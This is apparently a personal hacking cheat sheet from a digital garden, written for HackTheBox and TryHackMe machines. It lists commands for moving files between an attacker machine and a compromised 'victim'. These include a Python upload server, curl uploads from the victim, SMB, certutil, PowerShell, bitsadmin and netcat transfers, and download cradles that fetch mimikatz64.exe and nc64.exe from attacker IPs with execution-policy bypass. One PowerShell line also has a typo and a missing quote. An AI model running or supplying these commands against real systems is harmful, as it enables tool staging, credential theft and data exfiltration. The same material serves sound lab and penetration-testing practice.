---
{"dg-publish":true,"dg-path":"Garden/knowledge-base/hacking/references/File Transfer Commands.md","permalink":"/garden/knowledge-base/hacking/references/file-transfer-commands/","tags":["commands"],"created":"2024-05-19 18:02","updated":"2026-03-08 20:47"}
---

# File Transfer commands

home: [[02-Area/hacking/Hacking#Useful commands\|Hacking#Useful commands]]
tags: #commands

All this below has evolved into my repo at [GitHub - the-c0d3r/htb-scripts: Scripts I wrote for hacking HackTheBox machines or TryHackMe machines · GitHub](https://github.com/the-c0d3r/htb-scripts).

Also related to [[02-Area/hacking/privilege escalation/windows/Windows files\|Windows files]].

## HTTP (download)

This way can only send file to target

```bash
# python3
python3 -m http.server 8080

# python2 
python2 -m SimpleHttpServer 8080
```

## HTTP (upload)

```python
"""Extend Python's built in HTTP server to save files
curl or wget can be used to send files with options similar to the following
  curl -X PUT --upload-file somefile.txt http://localhost:8000
  wget -O- --method=PUT --body-file=somefile.txt http://localhost:8000/somefile.txt
__Note__: curl automatically appends the filename onto the end of the URL so
the path can be omitted.
"""
import os
try:
    import http.server as server
except ImportError:
    # Handle Python 2.x
    import SimpleHTTPServer as server

class HTTPRequestHandler(server.SimpleHTTPRequestHandler):
    """Extend SimpleHTTPRequestHandler to handle PUT requests"""
    def do_PUT(self):
        """Save a file following a HTTP PUT request"""
        filename = os.path.basename(self.path)

        file_length = int(self.headers['Content-Length'])
        with open(filename, 'wb') as output_file:
            output_file.write(self.rfile.read(file_length))
        self.send_response(201, 'Created')
        self.end_headers()
        reply_body = 'Saved "%s"\n' % filename
        self.wfile.write(reply_body.encode('utf-8'))

if __name__ == '__main__':
    server.test(HandlerClass=HTTPRequestHandler)
```

Upload from the victim

```bash
python3 http_put_server.py
```

Victim requires curl or wget

```bash
curl -T filename.exe http://192.168.119.176:8000/filename.exe
```

## SMB

```bash
impacket-smbserver SHARE /path
```

Download to target: `copy \\10.10.10.10\SHARE\nc.exe`
Upload to kali: `copy user.txt \\10.10.10.10\SHARE\`

## Certutils (windows, download)

```cmd
certutil -urlcache -f http://10.10.10.10/nc.exe nc.exe
```

## Powershell (windows, download)

```ps
cho $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

Execute `powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1`

```ps

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.115/mimikatz64.exe','C:\cat.exe')"

powershell -c "Invoke-WebRequest http://10.10.14.115/mimikatz64.exe -OutFile c:\data\users\defaultaccount\downloads\cat.exe

powershell -c "Invoke-WebRequest http://10.10.14.115/nc64.exe -OutFile c:\data\users\defaultaccount\downloads\nc64.exe"
```

## BITS

```
bitsadmin /transfer pwn /download http://10.10.0.1/sc.exe C:\sc.exe
```

## NC

receiver

```
nc -lvp 1337 > out.txt
```

sender

```
nc 192.168.1.1 1337 < file.txt
```